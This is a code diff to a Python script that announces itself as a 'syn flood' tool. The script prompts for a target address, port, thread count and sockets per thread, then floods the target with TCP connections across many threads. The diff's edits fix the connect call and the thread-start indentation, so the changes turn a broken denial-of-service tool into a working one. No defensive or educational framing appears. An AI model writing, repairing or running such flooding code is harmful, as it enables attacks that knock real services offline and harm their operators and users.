@@ -19,7 +19,7 @@ time.sleep(0.5)
 ip = str(input("Url/ip:"))
 port = int(input("Port:"))
 thread_num = int(input("Threads:"))
-times = int(input("Sockets of a thrrad:"))
+times = int(input("Sockets of a thread:"))
 print ("[!]Start a syn flood\r\n[!]Thread:",thread_num)
 time.sleep(1)
 
@@ -29,7 +29,7 @@ def run():
 		try:
 			print("[!]Try to build a new thread")
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect(str(ip),int(port))
+			s.connect((str(ip),int(port)))
 			for y in range(times):
 				s.send(bytes)
 			print ("[*]Request sent!")
@@ -39,4 +39,4 @@ def run():
 			
 for i in range(thread_num):
     th = threading.Thread(target = run)
-th.start()
+    th.start()
